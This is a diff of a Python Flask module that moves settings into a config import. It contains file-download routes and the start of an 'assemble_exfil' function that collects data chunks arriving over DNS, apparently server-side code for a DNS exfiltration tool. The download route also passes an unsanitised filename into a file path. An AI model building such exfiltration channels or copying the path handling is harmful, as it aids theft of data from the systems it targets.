@@ -1,19 +1,24 @@
+from app import app
+import config as cfg
+from flask import render_template, redirect, url_for, send_file
+import time, os
+
 # --------------------------------- DOWNLOAD --------------------------------- #
 
 @app.route('/download')
 def download():
-    if not authenticated:
+    if not cfg.authenticated:
         return redirect(url_for('login'))
-    files = os.listdir(DOWNLOAD_FOLDER)
+    files = os.listdir(cfg.DOWNLOAD_FOLDER)
     return render_template("download.html", files=files)
 
 @app.route('/download/<filename>')
 def download_file(filename):
-    if not authenticated:
+    if not cfg.authenticated:
         return redirect(url_for('login'))
-    return send_file(os.path.join(DOWNLOAD_FOLDER, filename), as_attachment=True)
+    return send_file(os.path.join(cfg.DOWNLOAD_FOLDER, filename), as_attachment=True)
 
-def assemble_exfil(timeout=DNS_RESPONSE_TIMEOUT, poll=DNS_POLL_INTERVAL):
+def assemble_exfil(timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL):
     """
     Wait up to `timeout` seconds for all expected_chunks to arrive,
     polling exfil_buffer every `poll` seconds. Returns the assembled
